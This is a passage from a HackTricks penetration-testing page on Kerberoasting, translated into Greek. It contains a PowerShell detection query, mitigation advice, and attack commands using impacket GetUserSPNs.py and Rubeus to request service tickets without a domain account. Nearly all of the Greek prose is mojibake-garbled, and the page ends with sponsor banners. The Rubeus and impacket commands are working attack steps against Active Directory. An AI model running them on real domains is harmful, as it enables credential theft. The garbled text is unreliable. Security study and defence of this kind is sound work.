Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Î“Î¹Î± Î½Î± Î¼ÎµÎ¹ÏÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÎ¯Î½Î´Ï…Î½Î¿ Ï„Î¿Ï… Kerberoasting:

* Î’ÎµÎ²Î±Î¹Ï‰Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î¿Î¹ **ÎšÏ‰Î´Î¹ÎºÎ¿Î¯ Î¥Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ Î›Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏÎ½ ÎµÎ¯Î½Î±Î¹ Î´ÏÏƒÎºÎ¿Î»Î¿Î¹ Î½Î± Î¼Î±Î½Ï„ÎµÏ…Ï„Î¿ÏÎ½**, ÏƒÏ…ÏƒÏ„Î®Î½Î¿Î½Ï„Î±Ï‚ Î¼Î®ÎºÎ¿Ï‚ Ï€Î¬Î½Ï‰ Î±Ï€ÏŒ **25 Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚**.
* Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ **Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î¿Ï…Ï‚ Î›Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚ Î¥Ï€Î·ÏÎµÏƒÎ¹ÏÎ½**, Î¿Î¹ Î¿Ï€Î¿Î¯Î¿Î¹ Ï€ÏÎ¿ÏƒÏ†Î­ÏÎ¿Ï…Î½ Î¿Ï†Î­Î»Î· ÏŒÏ€Ï‰Ï‚ **Î±Ï…Ï„ÏŒÎ¼Î±Ï„ÎµÏ‚ Î±Î»Î»Î±Î³Î­Ï‚ ÎºÏ‰Î´Î¹ÎºÏÎ½** ÎºÎ±Î¹ **Î±Î½Î±Î¸ÎµÏ‰ÏÎ·Î¼Î­Î½Î· Î”Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· ÎŸÎ½Î¿Î¼Î¬Ï„Ï‰Î½ Î¥Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ ÎšÏÏÎ¹Î¿Ï… (SPN)**, ÎµÎ½Î¹ÏƒÏ‡ÏÎ¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î± ÎµÎ½Î¬Î½Ï„Î¹Î± ÏƒÎµ Ï„Î­Ï„Î¿Î¹Î¿Ï… ÎµÎ¯Î´Î¿Ï…Ï‚ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚.

ÎœÎµ Ï„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î±Ï…Ï„ÏÎ½ Ï„Ï‰Î½ Î¼Î­Ï„ÏÏ‰Î½, Î¿Î¹ Î¿ÏÎ³Î±Î½Î¹ÏƒÎ¼Î¿Î¯ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î¼ÎµÎ¹ÏÏƒÎ¿Ï…Î½ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ¬ Ï„Î¿Î½ ÎºÎ¯Î½Î´Ï…Î½Î¿ Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î¿ Kerberoasting.

## Kerberoast Ï‡Ï‰ÏÎ¯Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï„Î¿Î¼Î­Î±

Î¤Î¿Î½ **Î£ÎµÏ€Ï„Î­Î¼Î²ÏÎ¹Î¿ Ï„Î¿Ï… 2022**, Î­Î½Î±Ï‚ Î½Î­Î¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ ÎµÎ½ÏŒÏ‚ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ Ï†Î­ÏÎ¸Î·ÎºÎµ ÏƒÏ„Î¿ Ï†Ï‰Ï‚ Î±Ï€ÏŒ Î­Î½Î±Î½ ÎµÏÎµÏ…Î½Î·Ï„Î® Î¼Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Charlie Clark, ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎµ Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î±Ï‚ Ï„Î¿Ï… [exploit.ph](https://exploit.ph/). Î‘Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Ï€ÏŒÎºÏ„Î·ÏƒÎ· **Î•Î¹ÏƒÎ¹Ï„Î·ÏÎ¯Ï‰Î½ Î¥Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ (ST)** Î¼Î­ÏƒÏ‰ ÎµÎ½ÏŒÏ‚ Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚ **KRB\_AS\_REQ**, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎµÎ½Ï„Ï…Ï€Ï‰ÏƒÎ¹Î±ÎºÎ¬ Î´ÎµÎ½ Î±Ï€Î±Î¹Ï„ÎµÎ¯ Î­Î»ÎµÎ³Ï‡Î¿ ÎµÏ€Î¯ ÎºÎ¬Ï€Î¿Î¹Î¿Ï… Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Active Directory. ÎšÎ±Ï„Î¬ Î²Î¬ÏƒÎ·, Î±Î½ Î­Î½Î±Ï‚ Ï€ÏÏ‰Ï„Î±ÏÏ‡Î¹ÎºÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿Ï‚ Î¼Îµ Ï„Î­Ï„Î¿Î¹Î¿ Ï„ÏÏŒÏ€Î¿ ÏÏƒÏ„Îµ Î½Î± Î¼Î·Î½ Î±Ï€Î±Î¹Ï„ÎµÎ¯ Ï€ÏÎ¿-Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ· - Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î¿ Î¼Îµ Î±Ï…Ï„ÏŒ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î³Î½Ï‰ÏƒÏ„ÏŒ ÏƒÏ„Î¿Î½ ÎºÏ…Î²ÎµÏÎ½Î¿Ï‡ÏÏÎ¿ Ï‰Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ· **AS-REP Roasting** - Î±Ï…Ï„ÏŒ Ï„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î¾Î¹Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï„Î·Î½ Ï€Î±ÏÎ±Ï€Î»Î¬Î½Î·ÏƒÎ· Ï„Î·Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±Ï‚ Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚. Î£Ï…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î±, Î¼Îµ Ï„Î·Î½ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¿Ï **sname** ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… ÏƒÏÎ¼Î±Ï„Î¿Ï‚ Ï„Î¿Ï… Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚, Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Ï€Î±ÏÎ±Ï€Î»Î±Î½Î¬Ï„Î±Î¹ ÏÏƒÏ„Îµ Î½Î± ÎµÎºÎ´ÏÏƒÎµÎ¹ Î­Î½Î± **ST** Î±Î½Ï„Î¯ Î³Î¹Î± Ï„Î¿ ÎºÎ±Î½Î¿Î½Î¹ÎºÏŒ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿ Î•Î¹ÏƒÎ¹Ï„Î®ÏÎ¹Î¿ Î§Î¿ÏÎ®Î³Î·ÏƒÎ·Ï‚ Î•Î¹ÏƒÎ¹Ï„Î·ÏÎ¯Ï‰Î½ (TGT).

Î— Ï„ÎµÏ‡Î½Î¹ÎºÎ® ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ Ï€Î»Î®ÏÏ‰Ï‚ ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î¬ÏÎ¸ÏÎ¿: [Î‘Î½Î¬ÏÏ„Î·ÏƒÎ· Î¹ÏƒÏ„Î¿Î»Î¿Î³Î¯Î¿Ï… Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Î ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€Î±ÏÎ­Ï‡ÎµÏ„Îµ Î¼Î¹Î± Î»Î¯ÏƒÏ„Î± Ï‡ÏÎ·ÏƒÏ„ÏÎ½ ÎµÏ€ÎµÎ¹Î´Î® Î´ÎµÎ½ Î­Ï‡Î¿Ï…Î¼Îµ Î­Î³ÎºÏ…ÏÎ¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Î³Î¹Î± Î½Î± ÎµÏÏ‰Ï„Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ LDAP Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ®.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py Î±Ï€ÏŒ Ï„Î¿ PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus Î±Ï€ÏŒ Ï„Î¿ PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± Ï„Î·Î»ÎµÎ³ÏÎ±Ï†Î®Î¼Î±Ï„Î¿Ï‚**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ GitHub.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ ÎµÏÎºÎ¿Î»Î± ÎºÎ±Î¹ Î½Î± **Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÏÎ¿Î­Ï‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚** Î¼Îµ Ï„Î± Ï€Î¹Î¿ Ï€ÏÎ¿Î·Î³Î¼Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± Ï„Î·Ï‚ ÎºÎ¿Î¹Î½ÏŒÏ„Î·Ï„Î±Ï‚.\
Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎ®Î¼ÎµÏÎ±:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
